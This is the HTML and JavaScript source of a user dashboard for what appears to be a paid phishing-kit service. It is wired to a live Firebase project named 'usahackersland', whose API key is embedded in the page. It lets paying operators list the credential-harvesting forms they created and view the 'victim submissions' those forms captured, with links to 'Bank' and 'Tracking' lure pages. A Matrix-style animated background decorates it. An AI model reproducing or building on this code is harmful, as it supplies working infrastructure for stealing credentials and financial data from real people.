<!DOCTYPE html>
<html>
<head>
  <title>üìã User Dashboard - Form Builder</title>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-auth-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-firestore-compat.js"></script>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: black;
      color: #0f0;
      margin: 0; padding: 0;
      height: 100vh;
      overflow: hidden;
      position: relative;
    }
    .navbar {
      background: #007700cc;
      color: white;
      padding: 15px;
      display: flex;
      justify-content: space-between;
      align-items: center;
      position: relative;
      z-index: 2;
    }
    .navbar h1 {
      margin: 0;
      font-size: 20px;
    }
    .navbar button {
      background: white;
      color: #007700;
      padding: 8px 16px;
      border: none;
      border-radius: 4px;
      cursor: pointer;
    }
    .dashboard {
      max-width: 900px;
      margin: 20px auto;
      padding: 20px;
      background: rgba(0,0,0,0.7);
      border-radius: 10px;
      box-shadow: 0 0 10px rgba(0,255,0,0.4);
      position: relative;
      z-index: 2;
      overflow-y: auto;
      height: calc(100vh - 70px);
    }
    .section {
      margin-top: 30px;
    }
    h2 {
      border-bottom: 2px solid #0f0;
      padding-bottom: 8px;
      color: #0f0;
    }
    .card {
      background: #003300;
      padding: 10px;
      border-radius: 6px;
      margin: 10px 0;
      color: #aaffaa;
    }
    a.button {
      display: inline-block;
      margin: 10px 5px;
      padding: 10px 20px;
      background: #007700;
      color: white;
      text-decoration: none;
      border-radius: 5px;
      font-weight: bold;
    }
    /* Canvas covers whole background */
    #backgroundCanvas {
      position: fixed;
      top: 0; left: 0;
      width: 100vw;
      height: 100vh;
      z-index: 1;
      pointer-events: none;
    }
  </style>
</head>
<body>
  <canvas id="backgroundCanvas"></canvas>

  <div class="navbar">
    <h1>üìã Form Builder Dashboard</h1>
    <button onclick="logout()">Logout</button>
  </div>

  <div class="dashboard">
    <div>
      <a href="Social-media-links/index.html" class="button" target="_blank">üõ† Build Form</a>
      <a href="Social-media-links/forms.html" class="button" target="_blank">üîó My Links</a>
      <a href="Social-media-links/victims.html" class="button" target="_blank">üë• View Victims</a>
      <a href="Social-media-links/bank.html" class="button" target="_blank">üè¶ Bank</a>
      <a href="Social-media-links/tracking.html" class="button" target="_blank">üì¶ Tracking</a>
    </div>

    <div class="section" id="forms">
      <h2>üîó My Created Links</h2>
      <div id="formsList">Loading forms...</div>
    </div>

    <div class="section" id="victims">
      <h2>üë• Victim Submissions</h2>
      <div id="victimsList">Loading victims...</div>
    </div>
  </div>

  <script>
    // Firebase config & init
    const firebaseConfig = {
      apiKey: "AIzaSyB5zWUvl64s6wAjjeXd0mCUyhMEdzg_MmM",
      authDomain: "usahackersland.firebaseapp.com",
      projectId: "usahackersland",
      storageBucket: "usahackersland.appspot.com",
      messagingSenderId: "588407428267",
      appId: "1:588407428267:web:7c4898cbb62efd3d5953ee"
    };
    firebase.initializeApp(firebaseConfig);
    const auth = firebase.auth();
    const db = firebase.firestore();

    let currentUserEmail = null;

    // Redirect to login if no user
    auth.onAuthStateChanged(async (user) => {
      if (!user) {
        window.location.href = "login.html";
        return;
      }
      try {
        const docSnap = await db.collection("users").doc(user.uid).get();
        if (!docSnap.exists) {
          alert("No user record found. Contact support.");
          return auth.signOut();
        }
        const userData = docSnap.data();

        // Removed admin redirect to keep user here

        if (userData.paid === false) {
          return window.location.href = "payment.html";
        }
        currentUserEmail = user.email;
        loadForms();
        loadVictims();
      } catch (err) {
        console.error(err);
      }
    });

    function logout() {
      auth.signOut().then(() => window.location.href = "login.html");
    }

    function loadForms() {
      const container = document.getElementById("formsList");
      db.collection("forms").where("formOwner", "==", currentUserEmail).get().then(snapshot => {
        container.innerHTML = "";
        if (snapshot.empty) {
          container.innerHTML = "<p>No forms found.</p>";
          return;
        }
        snapshot.forEach(doc => {
          const data = doc.data();
          const div = document.createElement("div");
          div.className = "card";
          div.innerHTML = `
            <strong>Title:</strong> ${data.title || 'No title'}<br>
            <strong>Created:</strong> ${new Date(data.createdAt).toLocaleString()}<br>
            <strong>Link:</strong> <a href="form.html?id=${doc.id}" target="_blank">Open Form</a>
          `;
          container.appendChild(div);
        });
      });
    }

    function loadVictims() {
      const container = document.getElementById("victimsList");
      db.collection("victims").where("formOwner", "==", currentUserEmail).get().then(snapshot => {
        container.innerHTML = "";
        if (snapshot.empty) {
          container.innerHTML = "<p>No victim submissions yet.</p>";
          return;
        }
        snapshot.forEach(doc => {
          const data = doc.data();
          const div = document.createElement("div");
          div.className = "card";
          div.innerHTML = `
            <strong>Date:</strong> ${new Date(data.createdAt).toLocaleString()}<br>
            ${Object.keys(data).map(k => `<strong>${k}:</strong> ${data[k]}`).join("<br>")}
          `;
          container.appendChild(div);
        });
      });
    }

    // MATRIX GREEN CODE RAIN BACKGROUND

    const canvas = document.getElementById('backgroundCanvas');
    const ctx = canvas.getContext('2d');
    let width, height;
    let animationFrameId = null;

    function resize() {
      width = canvas.width = window.innerWidth;
      height = canvas.height = window.innerHeight;
    }
    window.addEventListener('resize', resize);
    resize();

    const letters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%^&*()*&^%';
    const fontSize = 16;
    const columns = Math.floor(width / fontSize);
    const drops = Array(columns).fill(1);

    function draw() {
      ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
      ctx.fillRect(0, 0, width, height);

      ctx.fillStyle = '#0F0';
      ctx.font = fontSize + "px monospace";

      for(let i = 0; i < drops.length; i++) {
        const text = letters.charAt(Math.floor(Math.random() * letters.length));
        ctx.fillText(text, i * fontSize, drops[i] * fontSize);

        if(drops[i] * fontSize > height && Math.random() > 0.975) drops[i] = 0;

        drops[i]++;
      }
      animationFrameId = requestAnimationFrame(draw);
    }
    draw();

  </script>
</body>
</html>
